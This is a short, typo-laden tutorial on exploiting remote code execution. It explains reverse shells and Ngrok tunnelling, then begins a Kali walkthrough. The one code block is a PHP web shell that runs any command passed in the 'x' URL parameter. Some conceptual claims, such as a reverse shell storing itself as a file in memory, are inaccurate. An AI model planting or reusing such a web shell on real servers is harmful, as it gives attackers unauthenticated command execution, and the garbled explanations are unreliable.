= Exploiting RCE =

An RCE (Remote Code Execution) is the execution of your command on the enemies (victim) machine.

A reverse shell though, is an escalation of that, that is harder to detect, and that dumps itself as a file inside the memory and leaves there, and allows to expoit *multiple* commands, and not only one at a time. Also, it might be defined as a "connect-back" shell on the victim's machine, that redirects input/output to a remote machine (the attacker)

*Ngrok* is a very handy tool that can work as a kind of proxy, or maybe even client that can help you keep the traffic.

A dumb definition for Ngrok is "API first ingress as-a-servic". In easier words, it is just a simulation of an "API", which is really focused on *incoming traffic* (ingress). This also might mean that we can expose a local sercice to a DNS name reachable from the internet.

The connection is initiated from within the local network, to the outside.

== Let's exploit it! ==

First, we are going to fire up our Kali VM and create php file which will be sending our commands. Also do not forget to check if apache is up and running.

* Create a file called */var/www/html/rce.php* (this is directory for apache) with the following code:
{{{php
<?php
	$output = shell_exec($_GET["x"]);
	echo "<pre>$output</pre>";
?>
}}}
